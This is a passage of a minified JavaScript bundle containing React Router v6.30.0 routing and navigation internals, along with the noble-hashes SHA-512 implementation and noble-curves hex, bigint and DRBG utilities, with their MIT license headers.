e?t.map((r,i)=>i===t.length-1?r.pathname:r.pathnameBase):t.map(r=>r.pathnameBase)}function UA(n,e,t,r){r===void 0&&(r=!1);let i;typeof n=="string"?i=Kl(n):(i=xu({},n),dn(!i.pathname||!i.pathname.includes("?"),Bg("?","pathname","search",i)),dn(!i.pathname||!i.pathname.includes("#"),Bg("#","pathname","hash",i)),dn(!i.search||!i.search.includes("#"),Bg("#","search","hash",i)));let s=n===""||i.pathname==="",o=s?"/":i.pathname,a;if(o==null)a=t;else{let f=e.length-1;if(!r&&o.startsWith("..")){let m=o.split("/");for(;m[0]==="..";)m.shift(),f-=1;i.pathname=m.join("/")}a=f>=0?e[f]:"/"}let l=FN(i,a),u=o&&o!=="/"&&o.endsWith("/"),h=(s||o===".")&&t.endsWith("/");return!l.pathname.endsWith("/")&&(u||h)&&(l.pathname+="/"),l}const Zs=n=>n.join("/").replace(/\/\/+/g,"/"),$N=n=>n.replace(/\/+$/,"").replace(/^\/*/,"/"),HN=n=>!n||n==="?"?"":n.startsWith("?")?n:"?"+n,qN=n=>!n||n==="#"?"":n.startsWith("#")?n:"#"+n;function KN(n){return n!=null&&typeof n.status=="number"&&typeof n.statusText=="string"&&typeof n.internal=="boolean"&&"data"in n}const jA=["post","put","patch","delete"];new Set(jA);const GN=["get",...jA];new Set(GN);/**
 * React Router v6.30.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function ku(){return ku=Object.assign?Object.assign.bind():function(n){for(var e=1;e<arguments.length;e++){var t=arguments[e];for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&(n[r]=t[r])}return n},ku.apply(this,arguments)}const xw=Y.createContext(null),QN=Y.createContext(null),fa=Y.createContext(null),up=Y.createContext(null),da=Y.createContext({outlet:null,matches:[],isDataRoute:!1}),VA=Y.createContext(null);function YN(n,e){let{relative:t}=e===void 0?{}:e;th()||dn(!1);let{basename:r,navigator:i}=Y.useContext(fa),{hash:s,pathname:o,search:a}=zA(n,{relative:t}),l=o;return r!=="/"&&(l=o==="/"?r:Zs([r,o])),i.createHref({pathname:l,search:a,hash:s})}function th(){return Y.useContext(up)!=null}function hp(){return th()||dn(!1),Y.useContext(up).location}function FA(n){Y.useContext(fa).static||Y.useLayoutEffect(n)}function kw(){let{isDataRoute:n}=Y.useContext(da);return n?cP():ZN()}function ZN(){th()||dn(!1);let n=Y.useContext(xw),{basename:e,future:t,navigator:r}=Y.useContext(fa),{matches:i}=Y.useContext(da),{pathname:s}=hp(),o=JSON.stringify(BA(i,t.v7_relativeSplatPath)),a=Y.useRef(!1);return FA(()=>{a.current=!0}),Y.useCallback(function(u,h){if(h===void 0&&(h={}),!a.current)return;if(typeof u=="number"){r.go(u);return}let f=UA(u,JSON.parse(o),s,h.relative==="path");n==null&&e!=="/"&&(f.pathname=f.pathname==="/"?e:Zs([e,f.pathname])),(h.replace?r.replace:r.push)(f,h.state,h)},[e,r,o,s,n])}function zA(n,e){let{relative:t}=e===void 0?{}:e,{future:r}=Y.useContext(fa),{matches:i}=Y.useContext(da),{pathname:s}=hp(),o=JSON.stringify(BA(i,r.v7_relativeSplatPath));return Y.useMemo(()=>UA(n,JSON.parse(o),s,t==="path"),[n,o,s,t])}function JN(n,e){return XN(n,e)}function XN(n,e,t,r){th()||dn(!1);let{navigator:i,static:s}=Y.useContext(fa),{matches:o}=Y.useContext(da),a=o[o.length-1],l=a?a.params:{};a&&a.pathname;let u=a?a.pathnameBase:"/";a&&a.route;let h=hp(),f;if(e){var m;let S=typeof e=="string"?Kl(e):e;u==="/"||(m=S.pathname)!=null&&m.startsWith(u)||dn(!1),f=S}else f=h;let v=f.pathname||"/",x=v;if(u!=="/"){let S=u.replace(/^\//,"").split("/");x="/"+v.replace(/^\//,"").split("/").slice(S.length).join("/")}let k=!s&&t&&t.matches&&t.matches.length>0?t.matches:xN(n,{pathname:x}),I=iP(k&&k.map(S=>Object.assign({},S,{params:Object.assign({},l,S.params),pathname:Zs([u,i.encodeLocation?i.encodeLocation(S.pathname).pathname:S.pathname]),pathnameBase:S.pathnameBase==="/"?u:Zs([u,i.encodeLocation?i.encodeLocation(S.pathnameBase).pathname:S.pathnameBase])})),o,t,r);return e&&I?Y.createElement(up.Provider,{value:{location:ku({pathname:"/",search:"",hash:"",state:null,key:"default"},f),navigationType:Bs.Pop}},I):I}function eP(){let n=lP(),e=KN(n)?n.status+" "+n.statusText:n instanceof Error?n.message:JSON.stringify(n),t=n instanceof Error?n.stack:null,i={padding:"0.5rem",backgroundColor:"rgba(200,200,200, 0.5)"},s=null;return Y.createElement(Y.Fragment,null,Y.createElement("h2",null,"Unexpected Application Error!"),Y.createElement("h3",{style:{fontStyle:"italic"}},e),t?Y.createElement("pre",{style:i},t):null,s)}const tP=Y.createElement(eP,null);class nP extends Y.Component{constructor(e){super(e),this.state={location:e.location,revalidation:e.revalidation,error:e.error}}static getDerivedStateFromError(e){return{error:e}}static getDerivedStateFromProps(e,t){return t.location!==e.location||t.revalidation!=="idle"&&e.revalidation==="idle"?{error:e.error,location:e.location,revalidation:e.revalidation}:{error:e.error!==void 0?e.error:t.error,location:t.location,revalidation:e.revalidation||t.revalidation}}componentDidCatch(e,t){console.error("React Router caught the following error during render",e,t)}render(){return this.state.error!==void 0?Y.createElement(da.Provider,{value:this.props.routeContext},Y.createElement(VA.Provider,{value:this.state.error,children:this.props.component})):this.props.children}}function rP(n){let{routeContext:e,match:t,children:r}=n,i=Y.useContext(xw);return i&&i.static&&i.staticContext&&(t.route.errorElement||t.route.ErrorBoundary)&&(i.staticContext._deepestRenderedBoundaryId=t.route.id),Y.createElement(da.Provider,{value:e},r)}function iP(n,e,t,r){var i;if(e===void 0&&(e=[]),t===void 0&&(t=null),r===void 0&&(r=null),n==null){var s;if(!t)return null;if(t.errors)n=t.matches;else if((s=r)!=null&&s.v7_partialHydration&&e.length===0&&!t.initialized&&t.matches.length>0)n=t.matches;else return null}let o=n,a=(i=t)==null?void 0:i.errors;if(a!=null){let h=o.findIndex(f=>f.route.id&&(a==null?void 0:a[f.route.id])!==void 0);h>=0||dn(!1),o=o.slice(0,Math.min(o.length,h+1))}let l=!1,u=-1;if(t&&r&&r.v7_partialHydration)for(let h=0;h<o.length;h++){let f=o[h];if((f.route.HydrateFallback||f.route.hydrateFallbackElement)&&(u=h),f.route.id){let{loaderData:m,errors:v}=t,x=f.route.loader&&m[f.route.id]===void 0&&(!v||v[f.route.id]===void 0);if(f.route.lazy||x){l=!0,u>=0?o=o.slice(0,u+1):o=[o[0]];break}}}return o.reduceRight((h,f,m)=>{let v,x=!1,k=null,I=null;t&&(v=a&&f.route.id?a[f.route.id]:void 0,k=f.route.errorElement||tP,l&&(u<0&&m===0?(uP("route-fallback",!1),x=!0,I=null):u===m&&(x=!0,I=f.route.hydrateFallbackElement||null)));let S=e.concat(o.slice(0,m+1)),b=()=>{let E;return v?E=k:x?E=I:f.route.Component?E=Y.createElement(f.route.Component,null):f.route.element?E=f.route.element:E=h,Y.createElement(rP,{match:f,routeContext:{outlet:h,matches:S,isDataRoute:t!=null},children:E})};return t&&(f.route.ErrorBoundary||f.route.errorElement||m===0)?Y.createElement(nP,{location:t.location,revalidation:t.revalidation,component:k,error:v,children:b(),routeContext:{outlet:null,matches:S,isDataRoute:!0}}):b()},null)}var WA=function(n){return n.UseBlocker="useBlocker",n.UseRevalidator="useRevalidator",n.UseNavigateStable="useNavigate",n}(WA||{}),hd=function(n){return n.UseBlocker="useBlocker",n.UseLoaderData="useLoaderData",n.UseActionData="useActionData",n.UseRouteError="useRouteError",n.UseNavigation="useNavigation",n.UseRouteLoaderData="useRouteLoaderData",n.UseMatches="useMatches",n.UseRevalidator="useRevalidator",n.UseNavigateStable="useNavigate",n.UseRouteId="useRouteId",n}(hd||{});function sP(n){let e=Y.useContext(xw);return e||dn(!1),e}function oP(n){let e=Y.useContext(QN);return e||dn(!1),e}function aP(n){let e=Y.useContext(da);return e||dn(!1),e}function $A(n){let e=aP(),t=e.matches[e.matches.length-1];return t.route.id||dn(!1),t.route.id}function lP(){var n;let e=Y.useContext(VA),t=oP(hd.UseRouteError),r=$A(hd.UseRouteError);return e!==void 0?e:(n=t.errors)==null?void 0:n[r]}function cP(){let{router:n}=sP(WA.UseNavigateStable),e=$A(hd.UseNavigateStable),t=Y.useRef(!1);return FA(()=>{t.current=!0}),Y.useCallback(function(i,s){s===void 0&&(s={}),t.current&&(typeof i=="number"?n.navigate(i):n.navigate(i,ku({fromRouteId:e},s)))},[n,e])}const K1={};function uP(n,e,t){!e&&!K1[n]&&(K1[n]=!0)}function hP(n,e){n==null||n.v7_startTransition,(n==null?void 0:n.v7_relativeSplatPath)===void 0&&(!e||e.v7_relativeSplatPath),e&&(e.v7_fetcherPersist,e.v7_normalizeFormMethod,e.v7_partialHydration,e.v7_skipActionErrorRevalidation)}function Mo(n){dn(!1)}function fP(n){let{basename:e="/",children:t=null,location:r,navigationType:i=Bs.Pop,navigator:s,static:o=!1,future:a}=n;th()&&dn(!1);let l=e.replace(/^\/*/,"/"),u=Y.useMemo(()=>({basename:l,navigator:s,static:o,future:ku({v7_relativeSplatPath:!1},a)}),[l,a,s,o]);typeof r=="string"&&(r=Kl(r));let{pathname:h="/",search:f="",hash:m="",state:v=null,key:x="default"}=r,k=Y.useMemo(()=>{let I=bw(h,l);return I==null?null:{location:{pathname:I,search:f,hash:m,state:v,key:x},navigationType:i}},[l,h,f,m,v,x,i]);return k==null?null:Y.createElement(fa.Provider,{value:u},Y.createElement(up.Provider,{children:t,value:k}))}function dP(n){let{children:e,location:t}=n;return JN(T0(e),t)}new Promise(()=>{});function T0(n,e){e===void 0&&(e=[]);let t=[];return Y.Children.forEach(n,(r,i)=>{if(!Y.isValidElement(r))return;let s=[...e,i];if(r.type===Y.Fragment){t.push.apply(t,T0(r.props.children,s));return}r.type!==Mo&&dn(!1),!r.props.index||!r.props.children||dn(!1);let o={id:r.props.id||s.join("-"),caseSensitive:r.props.caseSensitive,element:r.props.element,Component:r.props.Component,index:r.props.index,path:r.props.path,loader:r.props.loader,action:r.props.action,errorElement:r.props.errorElement,ErrorBoundary:r.props.ErrorBoundary,hasErrorBoundary:r.props.ErrorBoundary!=null||r.props.errorElement!=null,shouldRevalidate:r.props.shouldRevalidate,handle:r.props.handle,lazy:r.props.lazy};r.props.children&&(o.children=T0(r.props.children,s)),t.push(o)}),t}/**
 * React Router DOM v6.30.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function A0(){return A0=Object.assign?Object.assign.bind():function(n){for(var e=1;e<arguments.length;e++){var t=arguments[e];for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&(n[r]=t[r])}return n},A0.apply(this,arguments)}function pP(n,e){if(n==null)return{};var t={},r=Object.keys(n),i,s;for(s=0;s<r.length;s++)i=r[s],!(e.indexOf(i)>=0)&&(t[i]=n[i]);return t}function gP(n){return!!(n.metaKey||n.altKey||n.ctrlKey||n.shiftKey)}function mP(n,e){return n.button===0&&(!e||e==="_self")&&!gP(n)}const yP=["onClick","relative","reloadDocument","replace","state","target","to","preventScrollReset","viewTransition"],wP="6";try{window.__reactRouterVersion=wP}catch{}const vP="startTransition",G1=sR[vP];function _P(n){let{basename:e,children:t,future:r,window:i}=n,s=Y.useRef();s.current==null&&(s.current=TN({window:i,v5Compat:!0}));let o=s.current,[a,l]=Y.useState({action:o.action,location:o.location}),{v7_startTransition:u}=r||{},h=Y.useCallback(f=>{u&&G1?G1(()=>l(f)):l(f)},[l,u]);return Y.useLayoutEffect(()=>o.listen(h),[o,h]),Y.useEffect(()=>hP(r),[r]),Y.createElement(fP,{basename:e,children:t,location:a.location,navigationType:a.action,navigator:o,future:r})}const EP=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u",IP=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,Rc=Y.forwardRef(function(e,t){let{onClick:r,relative:i,reloadDocument:s,replace:o,state:a,target:l,to:u,preventScrollReset:h,viewTransition:f}=e,m=pP(e,yP),{basename:v}=Y.useContext(fa),x,k=!1;if(typeof u=="string"&&IP.test(u)&&(x=u,EP))try{let E=new URL(window.location.href),U=u.startsWith("//")?new URL(E.protocol+u):new URL(u),H=bw(U.pathname,v);U.origin===E.origin&&H!=null?u=H+U.search+U.hash:k=!0}catch{}let I=YN(u,{relative:i}),S=SP(u,{replace:o,state:a,target:l,preventScrollReset:h,relative:i,viewTransition:f});function b(E){r&&r(E),E.defaultPrevented||S(E)}return Y.createElement("a",A0({},m,{href:x||I,onClick:k||s?r:b,ref:t,target:l}))});var Q1;(function(n){n.UseScrollRestoration="useScrollRestoration",n.UseSubmit="useSubmit",n.UseSubmitFetcher="useSubmitFetcher",n.UseFetcher="useFetcher",n.useViewTransitionState="useViewTransitionState"})(Q1||(Q1={}));var Y1;(function(n){n.UseFetcher="useFetcher",n.UseFetchers="useFetchers",n.UseScrollRestoration="useScrollRestoration"})(Y1||(Y1={}));function SP(n,e){let{target:t,replace:r,state:i,preventScrollReset:s,relative:o,viewTransition:a}=e===void 0?{}:e,l=kw(),u=hp(),h=zA(n,{relative:o});return Y.useCallback(f=>{if(mP(f,t)){f.preventDefault();let m=r!==void 0?r:ud(u)===ud(h);l(n,{replace:m,state:i,preventScrollReset:s,relative:o,viewTransition:a})}},[u,l,h,r,i,t,n,s,o,a])}function Z1(n){if(!Number.isSafeInteger(n)||n<0)throw new Error("positive integer expected, got "+n)}function TP(n){return n instanceof Uint8Array||ArrayBuffer.isView(n)&&n.constructor.name==="Uint8Array"}function fp(n,...e){if(!TP(n))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(n.length))throw new Error("Uint8Array expected of length "+e+", got length="+n.length)}function AP(n){if(typeof n!="function"||typeof n.create!="function")throw new Error("Hash should be wrapped by utils.wrapConstructor");Z1(n.outputLen),Z1(n.blockLen)}function fd(n,e=!0){if(n.destroyed)throw new Error("Hash instance has been destroyed");if(e&&n.finished)throw new Error("Hash#digest() has already been called")}function bP(n,e){fp(n);const t=e.outputLen;if(n.length<t)throw new Error("digestInto() expects output buffer of length at least "+t)}const Da=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;/*! noble-hashes - MIT License (c) 2022 Paul Miller (paulmillr.com) */function Ug(n){return new DataView(n.buffer,n.byteOffset,n.byteLength)}function yi(n,e){return n<<32-e|n>>>e}function xP(n){if(typeof n!="string")throw new Error("utf8ToBytes expected string, got "+typeof n);return new Uint8Array(new TextEncoder().encode(n))}function Cw(n){return typeof n=="string"&&(n=xP(n)),fp(n),n}function kP(...n){let e=0;for(let r=0;r<n.length;r++){const i=n[r];fp(i),e+=i.length}const t=new Uint8Array(e);for(let r=0,i=0;r<n.length;r++){const s=n[r];t.set(s,i),i+=s.length}return t}class HA{clone(){return this._cloneInto()}}function qA(n){const e=r=>n().update(Cw(r)).digest(),t=n();return e.outputLen=t.outputLen,e.blockLen=t.blockLen,e.create=()=>n(),e}function KA(n=32){if(Da&&typeof Da.getRandomValues=="function")return Da.getRandomValues(new Uint8Array(n));if(Da&&typeof Da.randomBytes=="function")return Da.randomBytes(n);throw new Error("crypto.getRandomValues must be defined")}function CP(n,e,t,r){if(typeof n.setBigUint64=="function")return n.setBigUint64(e,t,r);const i=BigInt(32),s=BigInt(4294967295),o=Number(t>>i&s),a=Number(t&s),l=r?4:0,u=r?0:4;n.setUint32(e+l,o,r),n.setUint32(e+u,a,r)}function RP(n,e,t){return n&e^~n&t}function MP(n,e,t){return n&e^n&t^e&t}class GA extends HA{constructor(e,t,r,i){super(),this.blockLen=e,this.outputLen=t,this.padOffset=r,this.isLE=i,this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.buffer=new Uint8Array(e),this.view=Ug(this.buffer)}update(e){fd(this);const{view:t,buffer:r,blockLen:i}=this;e=Cw(e);const s=e.length;for(let o=0;o<s;){const a=Math.min(i-this.pos,s-o);if(a===i){const l=Ug(e);for(;i<=s-o;o+=i)this.process(l,o);continue}r.set(e.subarray(o,o+a),this.pos),this.pos+=a,o+=a,this.pos===i&&(this.process(t,0),this.pos=0)}return this.length+=e.length,this.roundClean(),this}digestInto(e){fd(this),bP(e,this),this.finished=!0;const{buffer:t,view:r,blockLen:i,isLE:s}=this;let{pos:o}=this;t[o++]=128,this.buffer.subarray(o).fill(0),this.padOffset>i-o&&(this.process(r,0),o=0);for(let f=o;f<i;f++)t[f]=0;CP(r,i-8,BigInt(this.length*8),s),this.process(r,0);const a=Ug(e),l=this.outputLen;if(l%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const u=l/4,h=this.get();if(u>h.length)throw new Error("_sha2: outputLen bigger than state");for(let f=0;f<u;f++)a.setUint32(4*f,h[f],s)}digest(){const{buffer:e,outputLen:t}=this;this.digestInto(e);const r=e.slice(0,t);return this.destroy(),r}_cloneInto(e){e||(e=new this.constructor),e.set(...this.get());const{blockLen:t,buffer:r,length:i,finished:s,destroyed:o,pos:a}=this;return e.length=i,e.pos=a,e.finished=s,e.destroyed=o,i%t&&e.buffer.set(r),e}}const Qh=BigInt(2**32-1),b0=BigInt(32);function QA(n,e=!1){return e?{h:Number(n&Qh),l:Number(n>>b0&Qh)}:{h:Number(n>>b0&Qh)|0,l:Number(n&Qh)|0}}function NP(n,e=!1){let t=new Uint32Array(n.length),r=new Uint32Array(n.length);for(let i=0;i<n.length;i++){const{h:s,l:o}=QA(n[i],e);[t[i],r[i]]=[s,o]}return[t,r]}const PP=(n,e)=>BigInt(n>>>0)<<b0|BigInt(e>>>0),LP=(n,e,t)=>n>>>t,DP=(n,e,t)=>n<<32-t|e>>>t,OP=(n,e,t)=>n>>>t|e<<32-t,BP=(n,e,t)=>n<<32-t|e>>>t,UP=(n,e,t)=>n<<64-t|e>>>t-32,jP=(n,e,t)=>n>>>t-32|e<<64-t,VP=(n,e)=>e,FP=(n,e)=>n,zP=(n,e,t)=>n<<t|e>>>32-t,WP=(n,e,t)=>e<<t|n>>>32-t,$P=(n,e,t)=>e<<t-32|n>>>64-t,HP=(n,e,t)=>n<<t-32|e>>>64-t;function qP(n,e,t,r){const i=(e>>>0)+(r>>>0);return{h:n+t+(i/2**32|0)|0,l:i|0}}const KP=(n,e,t)=>(n>>>0)+(e>>>0)+(t>>>0),GP=(n,e,t,r)=>e+t+r+(n/2**32|0)|0,QP=(n,e,t,r)=>(n>>>0)+(e>>>0)+(t>>>0)+(r>>>0),YP=(n,e,t,r,i)=>e+t+r+i+(n/2**32|0)|0,ZP=(n,e,t,r,i)=>(n>>>0)+(e>>>0)+(t>>>0)+(r>>>0)+(i>>>0),JP=(n,e,t,r,i,s)=>e+t+r+i+s+(n/2**32|0)|0,XP={fromBig:QA,split:NP,toBig:PP,shrSH:LP,shrSL:DP,rotrSH:OP,rotrSL:BP,rotrBH:UP,rotrBL:jP,rotr32H:VP,rotr32L:FP,rotlSH:zP,rotlSL:WP,rotlBH:$P,rotlBL:HP,add:qP,add3L:KP,add3H:GP,add4L:QP,add4H:YP,add5H:JP,add5L:ZP},Fe=XP,[e4,t4]=(()=>Fe.split(["0x428a2f98d728ae22","0x7137449123ef65cd","0xb5c0fbcfec4d3b2f","0xe9b5dba58189dbbc","0x3956c25bf348b538","0x59f111f1b605d019","0x923f82a4af194f9b","0xab1c5ed5da6d8118","0xd807aa98a3030242","0x12835b0145706fbe","0x243185be4ee4b28c","0x550c7dc3d5ffb4e2","0x72be5d74f27b896f","0x80deb1fe3b1696b1","0x9bdc06a725c71235","0xc19bf174cf692694","0xe49b69c19ef14ad2","0xefbe4786384f25e3","0x0fc19dc68b8cd5b5","0x240ca1cc77ac9c65","0x2de92c6f592b0275","0x4a7484aa6ea6e483","0x5cb0a9dcbd41fbd4","0x76f988da831153b5","0x983e5152ee66dfab","0xa831c66d2db43210","0xb00327c898fb213f","0xbf597fc7beef0ee4","0xc6e00bf33da88fc2","0xd5a79147930aa725","0x06ca6351e003826f","0x142929670a0e6e70","0x27b70a8546d22ffc","0x2e1b21385c26c926","0x4d2c6dfc5ac42aed","0x53380d139d95b3df","0x650a73548baf63de","0x766a0abb3c77b2a8","0x81c2c92e47edaee6","0x92722c851482353b","0xa2bfe8a14cf10364","0xa81a664bbc423001","0xc24b8b70d0f89791","0xc76c51a30654be30","0xd192e819d6ef5218","0xd69906245565a910","0xf40e35855771202a","0x106aa07032bbd1b8","0x19a4c116b8d2d0c8","0x1e376c085141ab53","0x2748774cdf8eeb99","0x34b0bcb5e19b48a8","0x391c0cb3c5c95a63","0x4ed8aa4ae3418acb","0x5b9cca4f7763e373","0x682e6ff3d6b2b8a3","0x748f82ee5defb2fc","0x78a5636f43172f60","0x84c87814a1f0ab72","0x8cc702081a6439ec","0x90befffa23631e28","0xa4506cebde82bde9","0xbef9a3f7b2c67915","0xc67178f2e372532b","0xca273eceea26619c","0xd186b8c721c0c207","0xeada7dd6cde0eb1e","0xf57d4f7fee6ed178","0x06f067aa72176fba","0x0a637dc5a2c898a6","0x113f9804bef90dae","0x1b710b35131c471b","0x28db77f523047d84","0x32caab7b40c72493","0x3c9ebe0a15c9bebc","0x431d67c49c100d4c","0x4cc5d4becb3e42b6","0x597f299cfc657e2a","0x5fcb6fab3ad6faec","0x6c44198c4a475817"].map(n=>BigInt(n))))(),Es=new Uint32Array(80),Is=new Uint32Array(80);class n4 extends GA{constructor(){super(128,64,16,!1),this.Ah=1779033703,this.Al=-205731576,this.Bh=-1150833019,this.Bl=-2067093701,this.Ch=1013904242,this.Cl=-23791573,this.Dh=-1521486534,this.Dl=1595750129,this.Eh=1359893119,this.El=-1377402159,this.Fh=-1694144372,this.Fl=725511199,this.Gh=528734635,this.Gl=-79577749,this.Hh=1541459225,this.Hl=327033209}get(){const{Ah:e,Al:t,Bh:r,Bl:i,Ch:s,Cl:o,Dh:a,Dl:l,Eh:u,El:h,Fh:f,Fl:m,Gh:v,Gl:x,Hh:k,Hl:I}=this;return[e,t,r,i,s,o,a,l,u,h,f,m,v,x,k,I]}set(e,t,r,i,s,o,a,l,u,h,f,m,v,x,k,I){this.Ah=e|0,this.Al=t|0,this.Bh=r|0,this.Bl=i|0,this.Ch=s|0,this.Cl=o|0,this.Dh=a|0,this.Dl=l|0,this.Eh=u|0,this.El=h|0,this.Fh=f|0,this.Fl=m|0,this.Gh=v|0,this.Gl=x|0,this.Hh=k|0,this.Hl=I|0}process(e,t){for(let E=0;E<16;E++,t+=4)Es[E]=e.getUint32(t),Is[E]=e.getUint32(t+=4);for(let E=16;E<80;E++){const U=Es[E-15]|0,H=Is[E-15]|0,q=Fe.rotrSH(U,H,1)^Fe.rotrSH(U,H,8)^Fe.shrSH(U,H,7),L=Fe.rotrSL(U,H,1)^Fe.rotrSL(U,H,8)^Fe.shrSL(U,H,7),N=Es[E-2]|0,B=Is[E-2]|0,z=Fe.rotrSH(N,B,19)^Fe.rotrBH(N,B,61)^Fe.shrSH(N,B,6),W=Fe.rotrSL(N,B,19)^Fe.rotrBL(N,B,61)^Fe.shrSL(N,B,6),K=Fe.add4L(L,W,Is[E-7],Is[E-16]),T=Fe.add4H(K,q,z,Es[E-7],Es[E-16]);Es[E]=T|0,Is[E]=K|0}let{Ah:r,Al:i,Bh:s,Bl:o,Ch:a,Cl:l,Dh:u,Dl:h,Eh:f,El:m,Fh:v,Fl:x,Gh:k,Gl:I,Hh:S,Hl:b}=this;for(let E=0;E<80;E++){const U=Fe.rotrSH(f,m,14)^Fe.rotrSH(f,m,18)^Fe.rotrBH(f,m,41),H=Fe.rotrSL(f,m,14)^Fe.rotrSL(f,m,18)^Fe.rotrBL(f,m,41),q=f&v^~f&k,L=m&x^~m&I,N=Fe.add5L(b,H,L,t4[E],Is[E]),B=Fe.add5H(N,S,U,q,e4[E],Es[E]),z=N|0,W=Fe.rotrSH(r,i,28)^Fe.rotrBH(r,i,34)^Fe.rotrBH(r,i,39),K=Fe.rotrSL(r,i,28)^Fe.rotrBL(r,i,34)^Fe.rotrBL(r,i,39),T=r&s^r&a^s&a,d=i&o^i&l^o&l;S=k|0,b=I|0,k=v|0,I=x|0,v=f|0,x=m|0,{h:f,l:m}=Fe.add(u|0,h|0,B|0,z|0),u=a|0,h=l|0,a=s|0,l=o|0,s=r|0,o=i|0;const _=Fe.add3L(z,K,d);r=Fe.add3H(_,B,W,T),i=_|0}({h:r,l:i}=Fe.add(this.Ah|0,this.Al|0,r|0,i|0)),{h:s,l:o}=Fe.add(this.Bh|0,this.Bl|0,s|0,o|0),{h:a,l}=Fe.add(this.Ch|0,this.Cl|0,a|0,l|0),{h:u,l:h}=Fe.add(this.Dh|0,this.Dl|0,u|0,h|0),{h:f,l:m}=Fe.add(this.Eh|0,this.El|0,f|0,m|0),{h:v,l:x}=Fe.add(this.Fh|0,this.Fl|0,v|0,x|0),{h:k,l:I}=Fe.add(this.Gh|0,this.Gl|0,k|0,I|0),{h:S,l:b}=Fe.add(this.Hh|0,this.Hl|0,S|0,b|0),this.set(r,i,s,o,a,l,u,h,f,m,v,x,k,I,S,b)}roundClean(){Es.fill(0),Is.fill(0)}destroy(){this.buffer.fill(0),this.set(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)}}const r4=qA(()=>new n4);/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const dp=BigInt(0),pp=BigInt(1),i4=BigInt(2);function ta(n){return n instanceof Uint8Array||ArrayBuffer.isView(n)&&n.constructor.name==="Uint8Array"}function nh(n){if(!ta(n))throw new Error("Uint8Array expected")}function ts(n,e){if(typeof e!="boolean")throw new Error(n+" boolean expected, got "+e)}const s4=Array.from({length:256},(n,e)=>e.toString(16).padStart(2,"0"));function na(n){nh(n);let e="";for(let t=0;t<n.length;t++)e+=s4[n[t]];return e}function tl(n){const e=n.toString(16);return e.length&1?"0"+e:e}function Rw(n){if(typeof n!="string")throw new Error("hex string expected, got "+typeof n);return n===""?dp:BigInt("0x"+n)}const Vi={_0:48,_9:57,A:65,F:70,a:97,f:102};function J1(n){if(n>=Vi._0&&n<=Vi._9)return n-Vi._0;if(n>=Vi.A&&n<=Vi.F)return n-(Vi.A-10);if(n>=Vi.a&&n<=Vi.f)return n-(Vi.a-10)}function bl(n){if(typeof n!="string")throw new Error("hex string expected, got "+typeof n);const e=n.length,t=e/2;if(e%2)throw new Error("hex string expected, got unpadded hex of length "+e);const r=new Uint8Array(t);for(let i=0,s=0;i<t;i++,s+=2){const o=J1(n.charCodeAt(s)),a=J1(n.charCodeAt(s+1));if(o===void 0||a===void 0){const l=n[s]+n[s+1];throw new Error('hex string expected, got non-hex character "'+l+'" at index '+s)}r[i]=o*16+a}return r}function Go(n){return Rw(na(n))}function fl(n){return nh(n),Rw(na(Uint8Array.from(n).reverse()))}function xl(n,e){return bl(n.toString(16).padStart(e*2,"0"))}function Cu(n,e){return xl(n,e).reverse()}function o4(n){return bl(tl(n))}function cn(n,e,t){let r;if(typeof e=="string")try{r=bl(e)}catch(s){throw new Error(n+" must be hex string or Uint8Array, cause: "+s)}else if(ta(e))r=Uint8Array.from(e);else throw new Error(n+" must be hex string or Uint8Array");const i=r.length;if(typeof t=="number"&&i!==t)throw new Error(n+" of length "+t+" expected, got "+i);return r}function ra(...n){let e=0;for(let r=0;r<n.length;r++){const i=n[r];nh(i),e+=i.length}const t=new Uint8Array(e);for(let r=0,i=0;r<n.length;r++){const s=n[r];t.set(s,i),i+=s.length}return t}function a4(n,e){if(n.length!==e.length)return!1;let t=0;for(let r=0;r<n.length;r++)t|=n[r]^e[r];return t===0}function l4(n){if(typeof n!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode(n))}const jg=n=>typeof n=="bigint"&&dp<=n;function gp(n,e,t){return jg(n)&&jg(e)&&jg(t)&&e<=n&&n<t}function Wr(n,e,t,r){if(!gp(e,t,r))throw new Error("expected valid "+n+": "+t+" <= n < "+r+", got "+e)}function YA(n){let e;for(e=0;n>dp;n>>=pp,e+=1);return e}function c4(n,e){return n>>BigInt(e)&pp}function u4(n,e,t){return n|(t?pp:dp)<<BigInt(e)}const Mw=n=>(i4<<BigInt(n-1))-pp,Vg=n=>new Uint8Array(n),X1=n=>Uint8Array.from(n);function ZA(n,e,t){if(typeof n!="number"||n<2)throw new Error("hashLen must be a number");if(typeof e!="number"||e<2)throw new Error("qByteLen must be a number");if(typeof t!="function")throw new Error("hmacFn must be a function");let r=Vg(n),i=Vg(n),s=0;const o=()=>{r.fill(1),i.fill(0),s=0},a=(...f)=>t(i,r,...f),l=(f=Vg())=>{i=a(X1([0]),f),r=a(),f.length!==0&&(i=a(X1([1]),f),r=a())},u=()=>{if(s++>=1e3)throw new Error("drbg: tried 1000 values");let f=0;const m=[];for(;f<e;){r=a();const v=r.slice();m.push(v),f+=r.length}return ra(...m)};return(f,m)=>{o(),l(f);let v;for(;!(v=m(u()));)l();return o(),v}}const h4={bigint:n=>typeof n=="bigint",function:n=>typeof n=="function",boolean:n=>typeof n=="boolean",string:n=>typeof n=="string",stringOrUint8Array:n=>typeof n=="string"||ta(n),isSafeInteger:n=>Number.isSafeInteger(n),array:n=>Array.isArray(n),field:(n,e)=>e.Fp.isValid(n),hash:n=>typeof n=="function"&&Number.isSafeInteger(n.outputLen)};function Gl(n,e,t={}){const r=(i,s,o)=>{const a=h4[s];if(typeof a!="function")throw new Error("invalid validator function");const l=n[i];if(!(o&&l===void 0)&&!a(l,n))throw new Error("param "+String(i)+" is invalid. Expected "+s+", got "+l)};for(const[i,s]of Object.entries(e))r(i,s,!1);for(const[i,s]of 